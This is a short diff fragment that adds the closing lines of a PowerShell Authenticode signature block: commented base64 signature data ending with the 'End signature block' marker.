+# kxmxHsWdZlm8b4ZO2FkWxebHiEmrqlxkyy43QeaSLfbifpD1LL3zCf1xJfCrzAK7
+# bnLXmCW4g/bO0CYoYBKhLr9samfc1tsZYoLss2fzlKVTLggZl4ejvhRwLoTCPd+2
+# UNqPV4GrIeEj1afyQ7zHIVP31zW74dlkESt7SJsfY66u9flk7NckKMK5yK7qjGUK
+# w+eQ+niAaV80YhXrQuORIu2OcdBG8dUeA9sQYPangzbpik4k9IuS7JghVnmxL+Ir
+# 97g5V5U37eS3H99O5JLfOgbR49Xa7k/kGDDNB5NoNJS6bRbCnp+AKota5hoUZsVu
+# RjJthPByJ2UfQsc6GkpWA6zCe3xs/DMti6e5Nru5uI8=
+# SIG # End signature block
